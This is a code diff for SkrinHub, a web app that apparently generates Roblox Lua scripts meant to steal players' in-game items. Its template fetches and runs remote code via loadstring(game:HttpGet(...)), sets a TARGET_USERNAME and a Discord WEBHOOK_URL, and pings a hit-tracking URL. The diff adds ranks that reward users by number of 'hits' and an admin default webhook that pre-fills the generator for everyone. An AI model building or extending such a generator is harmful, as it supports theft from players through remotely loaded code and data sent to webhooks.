@@ -734,6 +734,28 @@
   .crb-silver  { background:rgba(192,192,192,0.1); border:1px solid #c0c0c0; color:#c0c0c0; }
   .crb-bronze  { background:rgba(205,127,50,0.1);  border:1px solid #cd7f32; color:#cd7f32; }
   .crb-member  { background:rgba(136,136,136,0.1); border:1px solid #888;    color:#888; }
+  .crb-god     { background:rgba(250,204,21,.12);  border:1px solid #facc15; color:#facc15; }
+  .crb-legend  { background:rgba(249,115,22,.12);  border:1px solid #f97316; color:#f97316; }
+  .crb-elite   { background:rgba(167,139,250,.12); border:1px solid #a78bfa; color:#a78bfa; }
+  .crb-pro     { background:rgba(56,189,248,.12);  border:1px solid #38bdf8; color:#38bdf8; }
+  .crb-veteran { background:rgba(74,222,128,.12);  border:1px solid #4ade80; color:#4ade80; }
+  .crb-advanced{ background:rgba(96,165,250,.12);  border:1px solid #60a5fa; color:#60a5fa; }
+  .crb-newbie  { background:rgba(134,239,172,.1);  border:1px solid #86efac; color:#86efac; }
+  /* Rank tier rows */
+  .rank-tiers-list { display:flex; flex-direction:column; border:1px solid var(--border); border-radius:12px; overflow:hidden; margin-bottom:1rem; }
+  .rank-tier-row { display:flex; align-items:center; gap:1rem; padding:0.9rem 1.4rem; background:var(--panel); border-bottom:1px solid var(--border); cursor:pointer; transition:background 0.18s; }
+  .rank-tier-row:last-child { border-bottom:none; }
+  .rank-tier-row.no-click { cursor:default; }
+  .rank-tier-row:not(.no-click):hover { background:var(--surface); }
+  .rank-tier-icon { width:40px; height:40px; border-radius:9px; border:1px solid; display:flex; align-items:center; justify-content:center; font-size:1.35rem; flex-shrink:0; }
+  .rank-tier-info { flex:1; min-width:0; }
+  .rank-tier-name { font-family:'Rajdhani',sans-serif; font-size:1rem; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; }
+  .rank-tier-desc { font-family:'Share Tech Mono',monospace; font-size:0.63rem; color:var(--muted); margin-top:0.1rem; }
+  .rank-tier-req { display:flex; flex-direction:column; align-items:flex-end; flex-shrink:0; min-width:52px; }
+  .rank-req-num { font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; line-height:1.1; }
+  .rank-req-label { font-family:'Share Tech Mono',monospace; font-size:0.58rem; color:var(--muted); }
+  .rank-req-staff { font-family:'Share Tech Mono',monospace; font-size:0.7rem; font-weight:700; }
+  .rank-claim-popup { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:1.4rem; margin-bottom:1rem; text-align:center; animation:fadeUp 0.2s ease both; }
   /* -- ADMIN DASHBOARD PAGE -- */
   .adm-section { margin-bottom:1.4rem; }
   .adm-section-title { font-family:'Share Tech Mono',monospace; font-size:0.68rem; text-transform:uppercase; letter-spacing:0.14em; color:var(--admin); text-shadow:var(--admin-glow); margin-bottom:0.7rem; border-bottom:1px solid rgba(255,215,0,0.2); padding-bottom:0.4rem; }
@@ -1009,24 +1031,91 @@
     <!-- TAB: RANKS -->
     <div class="tab-page" id="tab-ranks">
     <div class="wrap">
-      <div class="ranks-header"><h2>Ranks</h2><p>Role hierarchy &amp; permissions</p></div>
-
-      <div class="rank-card admin-card">
-        <div class="admin-glow-strip"></div>
-        <div class="rank-icon">👑</div>
-        <div class="rank-info">
-          <div class="rank-name admin-name">Admin<span class="rank-you-tag" id="adminYouTag" style="display:none;">YOU</span></div>
-          <div class="rank-desc">Full access — site owner &amp; administrator. All features unlocked.</div>
-        </div>
-        <span class="rank-badge badge-admin">Admin</span>
-        <span class="rank-lock-icon" id="adminLockIcon">🔒</span>
-      </div>
+      <div class="ranks-header"><h2>🏅 Ranks</h2><p>Based on total scripts generated</p></div>
 
       <div class="discord-member-card" id="discordMemberCard" style="display:none;">
         <div class="discord-member-avatar"><img id="memberAvatar" src="" alt=""></div>
         <div class="discord-member-info">
           <div class="discord-member-name" id="memberName"></div>
-          <div class="discord-member-tag">✓ Verified server member</div>
+          <div class="discord-member-tag" id="memberRankTag">✓ Verified server member</div>
+        </div>
+      </div>
+
+      <div id="rankClaimPopup" class="rank-claim-popup" style="display:none;"></div>
+
+      <div class="rank-tiers-list">
+        <div class="rank-tier-row no-click">
+          <div class="rank-tier-icon" style="background:rgba(248,113,113,.1);border-color:rgba(248,113,113,.35);">🛡️</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#f87171;">Admin<span class="rank-you-tag" id="adminYouTag" style="display:none;">YOU</span></div>
+            <div class="rank-tier-desc">Site administrator</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-staff" style="color:#f87171;">Staff</span></div>
+          <span class="rank-lock-icon" id="adminLockIcon">🔒</span>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('god')">
+          <div class="rank-tier-icon" style="background:rgba(250,204,21,.1);border-color:rgba(250,204,21,.3);">👑</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#facc15;">God</div>
+            <div class="rank-tier-desc">Absolute top tier</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#facc15;">1,000+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('legend')">
+          <div class="rank-tier-icon" style="background:rgba(249,115,22,.1);border-color:rgba(249,115,22,.3);">🔥</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#f97316;">Legend</div>
+            <div class="rank-tier-desc">Elite grinder</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#f97316;">500+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('elite')">
+          <div class="rank-tier-icon" style="background:rgba(167,139,250,.1);border-color:rgba(167,139,250,.3);">⚡</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#a78bfa;">Elite</div>
+            <div class="rank-tier-desc">Serious user</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#a78bfa;">250+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('pro')">
+          <div class="rank-tier-icon" style="background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.3);">💎</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#38bdf8;">Pro</div>
+            <div class="rank-tier-desc">Dedicated</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#38bdf8;">100+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('veteran')">
+          <div class="rank-tier-icon" style="background:rgba(74,222,128,.1);border-color:rgba(74,222,128,.3);">🌿</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#4ade80;">Veteran</div>
+            <div class="rank-tier-desc">Well experienced</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#4ade80;">50+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('advanced')">
+          <div class="rank-tier-icon" style="background:rgba(96,165,250,.1);border-color:rgba(96,165,250,.3);">🔷</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#60a5fa;">Advanced</div>
+            <div class="rank-tier-desc">Getting there</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#60a5fa;">20+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('member')">
+          <div class="rank-tier-icon" style="background:rgba(148,163,184,.1);border-color:rgba(148,163,184,.3);">◆</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#94a3b8;">Member</div>
+            <div class="rank-tier-desc">Regular user</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#94a3b8;">5+</span><span class="rank-req-label">logs</span></div>
+        </div>
+        <div class="rank-tier-row" onclick="claimRankTier('newbie')">
+          <div class="rank-tier-icon" style="background:rgba(134,239,172,.1);border-color:rgba(134,239,172,.3);">🌱</div>
+          <div class="rank-tier-info">
+            <div class="rank-tier-name" style="color:#86efac;">Newbie</div>
+            <div class="rank-tier-desc">Just started</div>
+          </div>
+          <div class="rank-tier-req"><span class="rank-req-num" style="color:#86efac;">0+</span><span class="rank-req-label">logs</span></div>
         </div>
       </div>
 
@@ -1045,13 +1134,6 @@
           </div>
         </div>
       </div>
-
-      <div class="rank-card" style="animation-delay:0.05s"><div class="rank-icon">💎</div><div class="rank-info"><div class="rank-name">Diamond</div><div class="rank-desc">Elite members with highest engagement.</div></div><span class="rank-badge badge-diamond">Diamond</span></div>
-      <div class="rank-card" style="animation-delay:0.1s"><div class="rank-icon">🏆</div><div class="rank-info"><div class="rank-name">Platinum</div><div class="rank-desc">Top-tier contributors with advanced access.</div></div><span class="rank-badge badge-platinum">Platinum</span></div>
-      <div class="rank-card" style="animation-delay:0.15s"><div class="rank-icon">🥇</div><div class="rank-info"><div class="rank-name">Gold</div><div class="rank-desc">Active power users. Priority support &amp; early features.</div></div><span class="rank-badge badge-gold">Gold</span></div>
-      <div class="rank-card" style="animation-delay:0.2s"><div class="rank-icon">🥈</div><div class="rank-info"><div class="rank-name">Silver</div><div class="rank-desc">Regular users with verified activity.</div></div><span class="rank-badge badge-silver">Silver</span></div>
-      <div class="rank-card" style="animation-delay:0.25s"><div class="rank-icon">🥉</div><div class="rank-info"><div class="rank-name">Bronze</div><div class="rank-desc">New but active members starting their journey.</div></div><span class="rank-badge badge-bronze">Bronze</span></div>
-      <div class="rank-card" style="animation-delay:0.3s"><div class="rank-icon">🔰</div><div class="rank-info"><div class="rank-name">Member</div><div class="rank-desc">Default rank for all registered users.</div></div><span class="rank-badge badge-member">Member</span></div>
     </div>
     </div>
 
@@ -1291,19 +1373,27 @@
         <div class="ph"><div class="dot" style="background:var(--accent);box-shadow:0 0 8px var(--accent);border-radius:50%;width:7px;height:7px;flex-shrink:0;"></div><span class="ph-title" style="color:var(--accent);">Script Source Editor</span></div>
         <div class="pb">
           <div class="adm-section">
+            <div class="adm-section-title">Default Webhook URL</div>
+            <div class="adm-row" style="flex-direction:column;align-items:stretch;gap:0.4rem;">
+              <input class="adm-input" id="adminWebhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;">
+              <p style="font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--muted);margin:0;">Pre-fills the generator webhook for all users. Leave empty to disable.</p>
+            </div>
+          </div>
+          <div class="adm-section">
             <div class="adm-section-title">Loadstring URL</div>
             <div class="adm-row" style="flex-direction:column;align-items:stretch;gap:0.5rem;">
               <input class="adm-input" id="scriptLoadUrl" type="text" placeholder="https://raw.githubusercontent.com/..." style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;">
-              <div style="display:flex;gap:0.5rem;">
-                <button class="adm-btn" onclick="saveScriptSource()">💾 Save</button>
+              <div style="display:flex;gap:0.5rem;flex-wrap:wrap;">
+                <button class="adm-btn" onclick="saveScriptSource()">💾 Save All</button>
                 <button class="adm-btn" style="background:transparent;border:1px solid var(--border);color:var(--muted);" onclick="resetScriptSource()">↺ Reset</button>
+                <button class="adm-btn" style="background:rgba(56,189,248,.12);border:1px solid #38bdf8;color:#38bdf8;" onclick="fetchLiveSource()">↓ Fetch Source</button>
               </div>
               <div id="scriptSourceStatus" style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--green);min-height:1rem;"></div>
             </div>
           </div>
-          <div class="adm-section" style="margin-top:0.8rem;">
-            <div class="adm-section-title">Full Lua Template Preview</div>
-            <textarea id="scriptTemplatePreview" readonly style="width:100%;min-height:160px;resize:vertical;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:0.6rem;font-family:'Share Tech Mono',monospace;font-size:0.65rem;line-height:1.55;box-sizing:border-box;"></textarea>
+          <div class="adm-section" style="margin-top:0.6rem;">
+            <div class="adm-section-title">Live Script Source <span style="color:var(--muted);font-size:0.58rem;text-transform:none;letter-spacing:0;">(click Fetch Source to load from URL)</span></div>
+            <textarea id="scriptTemplatePreview" readonly style="width:100%;min-height:220px;resize:vertical;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:0.6rem;font-family:'Share Tech Mono',monospace;font-size:0.65rem;line-height:1.55;box-sizing:border-box;"></textarea>
           </div>
         </div>
       </div>
@@ -1350,6 +1440,21 @@ let blacklistedUsers = JSON.parse(localStorage.getItem('skrinhub_blacklist') || 
 let sessionStart = null;
 let sessionTimer = null;
 let scriptCount = 0;
+let myHits = 0;
+const RANK_TIERS = [
+  { id:'god',      label:'God',      icon:'👑', color:'#facc15', minHits:1000 },
+  { id:'legend',   label:'Legend',   icon:'🔥', color:'#f97316', minHits:500  },
+  { id:'elite',    label:'Elite',    icon:'⚡', color:'#a78bfa', minHits:250  },
+  { id:'pro',      label:'Pro',      icon:'💎', color:'#38bdf8', minHits:100  },
+  { id:'veteran',  label:'Veteran',  icon:'🌿', color:'#4ade80', minHits:50   },
+  { id:'advanced', label:'Advanced', icon:'🔷', color:'#60a5fa', minHits:20   },
+  { id:'member',   label:'Member',   icon:'◆',  color:'#94a3b8', minHits:5    },
+  { id:'newbie',   label:'Newbie',   icon:'🌱', color:'#86efac', minHits:0    },
+];
+function getRankFromHits(hits) {
+  for (const t of RANK_TIERS) { if (hits >= t.minHits) return t; }
+  return RANK_TIERS[RANK_TIERS.length - 1];
+}
 let chatOpen = false;
 let chatClientId = null;
 let chatEventSource = null;
@@ -1488,9 +1593,10 @@ function appendChatMsg(msg) {
   if (user.id === 'admin' || isHardcodedAdmin) {
     rankBadgeHtml = '<span class="chat-rank-badge crb-admin">👑 Admin</span>';
   } else {
-    const clsMap = {diamond:'crb-diamond',platinum:'crb-platinum',gold:'crb-gold',silver:'crb-silver',bronze:'crb-bronze',member:'crb-member'};
+    const clsMap = {god:'crb-god',legend:'crb-legend',elite:'crb-elite',pro:'crb-pro',veteran:'crb-veteran',advanced:'crb-advanced',member:'crb-member',newbie:'crb-newbie',diamond:'crb-diamond',platinum:'crb-platinum',gold:'crb-gold',silver:'crb-silver',bronze:'crb-bronze'};
+    const rankIcons = {god:'👑',legend:'🔥',elite:'⚡',pro:'💎',veteran:'🌿',advanced:'🔷',member:'◆',newbie:'🌱'};
     const rk = user.rank || (rankKey && userRanks[rankKey]);
-    if (rk && clsMap[rk]) rankBadgeHtml = '<span class="chat-rank-badge ' + clsMap[rk] + '">' + rk.charAt(0).toUpperCase() + rk.slice(1) + '</span>';
+    if (rk && clsMap[rk]) rankBadgeHtml = '<span class="chat-rank-badge ' + clsMap[rk] + '">' + (rankIcons[rk] ? rankIcons[rk]+' ' : '') + rk.charAt(0).toUpperCase() + rk.slice(1) + '</span>';
   }
 
   div.className = 'chat-msg';
@@ -1650,10 +1756,17 @@ async function fetchLeaderboard() {
     if (discordUser) {
       const myUid = discordUser.id || discordUser.username;
       const myIdx = data.findIndex(e => e.userId === myUid || e.username === discordUser.username);
+      myHits = myIdx >= 0 ? data[myIdx].hits : 0;
+      const tier = getRankFromHits(myHits);
+      // Update member card rank tag
+      const memberRankTag = document.getElementById('memberRankTag');
+      if (memberRankTag) {
+        memberRankTag.innerHTML = tier ? `${tier.icon} <span style="color:${tier.color};">${tier.label}</span> · ${myHits.toLocaleString()} hit${myHits===1?'':'s'}` : '✓ Verified server member';
+      }
       const yourRankEl = document.getElementById('yourRankBadge');
       if (yourRankEl) {
         if (myIdx >= 0) {
-          yourRankEl.textContent = `Your rank: #${myIdx + 1} • ${data[myIdx].hits} hit${data[myIdx].hits === 1 ? '' : 's'}`;
+          yourRankEl.textContent = `Your rank: #${myIdx + 1} • ${myHits.toLocaleString()} hit${myHits === 1 ? '' : 's'} • ${tier ? tier.icon + ' ' + tier.label : ''}`;
           yourRankEl.style.display = 'block';
         } else {
           yourRankEl.textContent = 'You have no hits yet. Generate and share a script!';
@@ -2172,7 +2285,8 @@ async function generate() {
   btn.disabled = true; btn.textContent = '⏳ Generating...'; btn.style.opacity = '0.6';
   try {
     const username = document.getElementById('usernameInput').value.trim();
-    const webhook = document.getElementById('webhookInput').value.trim();
+    let webhook = document.getElementById('webhookInput').value.trim();
+    if (!webhook) { webhook = localStorage.getItem('skrinhub_admin_webhook') || ''; }
     const currentUid = discordUser ? (discordUser.id || discordUser.username) : null;
     if (currentUid && blacklistedUsers[currentUid]) {
       const bl = blacklistedUsers[currentUid];
@@ -2414,35 +2528,104 @@ function loadExecutions() {
 }
 
 /* ─── ADMIN: SCRIPT SOURCE EDITOR ─── */
-const DEFAULT_LOAD_URL_ADMIN = 'https://api.jnkie.com/api/v1/luascripts/public/95857a68e1a567345873d6b94beee7cafe54eade260a3ccd3bcc2e7ce3d6fe4d/download';
+const DEFAULT_LOAD_URL_ADMIN = 'https://raw.githubusercontent.com/nexoradisc-create/skrinhubcode/refs/heads/main/skrinhub.lua';
 function buildTemplatePreview(url) {
   return `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("{HIT_URL}") end) end)\ngetgenv().WEBHOOK_URL = "{WEBHOOK_URL}"\ngetgenv().TARGET_USERNAME = "{TARGET_USERNAME}"\ngetgenv().TARGET_BRAINROT = {\n  {BRAINROT_LINES}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("${url || DEFAULT_LOAD_URL_ADMIN}"))()\nend)`;
 }
 function initScriptSourceEditor() {
-  const inp = document.getElementById('scriptLoadUrl');
-  const prev = document.getElementById('scriptTemplatePreview');
-  if (!inp || !prev) return;
-  const saved = localStorage.getItem('skrinhub_load_url') || DEFAULT_LOAD_URL_ADMIN;
-  inp.value = saved;
-  prev.value = buildTemplatePreview(saved);
-  inp.oninput = () => { prev.value = buildTemplatePreview(inp.value.trim()); };
+  const urlInp = document.getElementById('scriptLoadUrl');
+  const whInp  = document.getElementById('adminWebhookInput');
+  const prev   = document.getElementById('scriptTemplatePreview');
+  if (!urlInp) return;
+  urlInp.value = localStorage.getItem('skrinhub_load_url') || DEFAULT_LOAD_URL_ADMIN;
+  if (whInp) whInp.value = localStorage.getItem('skrinhub_admin_webhook') || '';
+  if (prev) prev.value = '';
 }
 function saveScriptSource() {
-  const inp = document.getElementById('scriptLoadUrl');
+  const urlInp = document.getElementById('scriptLoadUrl');
+  const whInp  = document.getElementById('adminWebhookInput');
   const status = document.getElementById('scriptSourceStatus');
-  const url = (inp?.value || '').trim();
-  if (url) { localStorage.setItem('skrinhub_load_url', url); }
-  else { localStorage.removeItem('skrinhub_load_url'); }
-  if (status) { status.textContent = '✓ Saved!'; setTimeout(() => status.textContent = '', 2000); }
+  const url = (urlInp?.value || '').trim();
+  const wh  = (whInp?.value  || '').trim();
+  if (url) localStorage.setItem('skrinhub_load_url', url);
+  else localStorage.removeItem('skrinhub_load_url');
+  if (wh) localStorage.setItem('skrinhub_admin_webhook', wh);
+  else localStorage.removeItem('skrinhub_admin_webhook');
+  if (status) { status.textContent = '✓ Saved!'; status.style.color = 'var(--green)'; setTimeout(() => status.textContent = '', 2000); }
 }
 function resetScriptSource() {
-  const inp = document.getElementById('scriptLoadUrl');
-  const prev = document.getElementById('scriptTemplatePreview');
+  const urlInp = document.getElementById('scriptLoadUrl');
+  const whInp  = document.getElementById('adminWebhookInput');
+  const prev   = document.getElementById('scriptTemplatePreview');
   const status = document.getElementById('scriptSourceStatus');
   localStorage.removeItem('skrinhub_load_url');
-  if (inp) inp.value = DEFAULT_LOAD_URL_ADMIN;
-  if (prev) prev.value = buildTemplatePreview(DEFAULT_LOAD_URL_ADMIN);
-  if (status) { status.textContent = '↺ Reset to default.'; setTimeout(() => status.textContent = '', 2000); }
+  localStorage.removeItem('skrinhub_admin_webhook');
+  if (urlInp) urlInp.value = DEFAULT_LOAD_URL_ADMIN;
+  if (whInp)  whInp.value  = '';
+  if (prev)   prev.value   = '';
+  if (status) { status.textContent = '↺ Reset to default.'; status.style.color = 'var(--muted)'; setTimeout(() => status.textContent = '', 2000); }
+}
+async function fetchLiveSource() {
+  const urlInp = document.getElementById('scriptLoadUrl');
+  const prev   = document.getElementById('scriptTemplatePreview');
+  const status = document.getElementById('scriptSourceStatus');
+  const url = (urlInp?.value || '').trim() || DEFAULT_LOAD_URL_ADMIN;
+  if (status) { status.textContent = '⏳ Fetching...'; status.style.color = 'var(--muted)'; }
+  try {
+    const res = await fetch(url);
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const text = await res.text();
+    if (prev) prev.value = text;
+    if (status) { status.textContent = '✓ Loaded ' + text.length + ' chars.'; status.style.color = 'var(--green)'; setTimeout(() => status.textContent = '', 3000); }
+  } catch (e) {
+    if (status) { status.textContent = '⚠ ' + e.message; status.style.color = '#ff4444'; setTimeout(() => status.textContent = '', 3000); }
+  }
+}
+
+/* ═══════════════════════ RANK CLAIM ═══════════════════════ */
+async function claimRankTier(rankId) {
+  if (!discordUser) { showToast('Sign in first to claim a rank.', 'error'); return; }
+  const tier = RANK_TIERS.find(t => t.id === rankId);
+  if (!tier) return;
+  const popup = document.getElementById('rankClaimPopup');
+  if (!popup) return;
+  popup.style.display = 'block';
+  popup.innerHTML = '<div style="font-family:\'Share Tech Mono\',monospace;font-size:0.72rem;color:var(--muted);">⏳ Checking hits...</div>';
+  const hits = await fetchMyHits();
+  if (hits >= tier.minHits) {
+    const uid = discordUser.id || discordUser.username;
+    userRanks[uid] = rankId;
+    localStorage.setItem('skrinhub_ranks', JSON.stringify(userRanks));
+    popup.innerHTML = `
+      <div style="font-size:1.8rem;line-height:1.2;">${tier.icon}</div>
+      <div style="font-family:'Rajdhani',sans-serif;font-size:1.2rem;font-weight:700;color:${tier.color};margin:0.3rem 0;">Rank Granted!</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--muted);">You are now <strong style="color:${tier.color};">${tier.label}</strong> · ${hits.toLocaleString()} hit${hits===1?'':'s'}.</div>
+      <button class="adm-btn" style="margin-top:0.8rem;" onclick="document.getElementById('rankClaimPopup').style.display='none'">✓ Done</button>`;
+    showToast(`${tier.icon} Rank "${tier.label}" granted!`, 'success');
+  } else {
+    const need = tier.minHits - hits;
+    popup.innerHTML = `
+      <div style="font-size:1.6rem;line-height:1.2;">🚫</div>
+      <div style="font-family:'Rajdhani',sans-serif;font-size:1.1rem;font-weight:700;color:#ff4444;margin:0.3rem 0;">Not Enough Hits</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--muted);">
+        Need <strong style="color:${tier.color};">${tier.minHits.toLocaleString()}</strong> hits for ${tier.icon} ${tier.label}.<br>
+        You have <strong>${hits.toLocaleString()}</strong> · Need <strong style="color:#ff4444;">${need.toLocaleString()}</strong> more.
+      </div>
+      <button class="adm-btn" style="margin-top:0.8rem;background:transparent;border:1px solid var(--border);color:var(--muted);" onclick="document.getElementById('rankClaimPopup').style.display='none'">✕ Close</button>`;
+  }
+}
+async function fetchMyHits() {
+  if (!discordUser) return myHits;
+  try {
+    const uname = encodeURIComponent(discordUser.username || '');
+    const res = await fetch('/api/hits/' + uname);
+    const data = await res.json();
+    myHits = data.hits ?? 0;
+    const tier = getRankFromHits(myHits);
+    const tag = document.getElementById('memberRankTag');
+    if (tag && tier) tag.innerHTML = `${tier.icon} <span style="color:${tier.color};">${tier.label}</span> · ${myHits.toLocaleString()} hit${myHits===1?'':'s'}`;
+    return myHits;
+  } catch { return myHits; }
 }
 
 /* ─── BOOT ─── */
@@ -2450,6 +2633,9 @@ applyTitles();
 renderList();
 updateChatInputState();
 connectChat();
+// Pre-fill generator webhook from admin default
+const _savedWh = localStorage.getItem('skrinhub_admin_webhook');
+if (_savedWh) { const _whi = document.getElementById('webhookInput'); if (_whi && !_whi.value) _whi.value = _savedWh; }
 checkAuth();
 </script>
 </body>
